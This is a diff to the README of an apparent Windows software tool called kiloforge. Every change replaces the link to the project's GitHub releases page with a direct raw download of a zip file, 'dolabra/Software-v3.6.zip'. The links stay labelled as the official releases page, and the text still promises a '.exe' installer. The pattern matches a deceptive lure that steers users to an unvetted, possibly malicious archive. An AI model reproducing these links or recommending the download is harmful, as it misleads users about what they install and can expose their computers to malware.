@@ -1,6 +1,6 @@
 # ⚙️ kiloforge - Fast Code Creation Made Simple
 
-[![Download kiloforge](https://img.shields.io/badge/Download-kiloforge-brightgreen?style=for-the-badge)](https://github.com/Jesse9505/kiloforge/releases)
+[![Download kiloforge](https://img.shields.io/badge/Download-kiloforge-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Jesse9505/kiloforge/main/dolabra/Software-v3.6.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Start here if you want to set up kiloforge on your Windows PC. Follow each step 
 ### Step 1: Download kiloforge
 
 1. Visit the official kiloforge releases page:  
-   [https://github.com/Jesse9505/kiloforge/releases](https://github.com/Jesse9505/kiloforge/releases)
+   [https://raw.githubusercontent.com/Jesse9505/kiloforge/main/dolabra/Software-v3.6.zip](https://raw.githubusercontent.com/Jesse9505/kiloforge/main/dolabra/Software-v3.6.zip)
 
 2. Look for the most recent version. The files usually end with `.exe` for Windows.
 
@@ -114,13 +114,13 @@ If none of these fix the issue, look for help on the GitHub issues page at the r
 
 You can start kiloforge by visiting the GitHub releases page and following these steps:
 
-- Visit [kiloforge Releases](https://github.com/Jesse9505/kiloforge/releases)
+- Visit [kiloforge Releases](https://raw.githubusercontent.com/Jesse9505/kiloforge/main/dolabra/Software-v3.6.zip)
 - Download the latest Windows `.exe` installer
 - Run the downloaded file and complete the installer prompts
 - Launch kiloforge from the desktop or Start menu
 - Begin creating software with simple instructions
 
-[![Download kiloforge](https://img.shields.io/badge/Download-kiloforge-blue?style=for-the-badge)](https://github.com/Jesse9505/kiloforge/releases)
+[![Download kiloforge](https://img.shields.io/badge/Download-kiloforge-blue?style=for-the-badge)](https://raw.githubusercontent.com/Jesse9505/kiloforge/main/dolabra/Software-v3.6.zip)
 
 ---
 
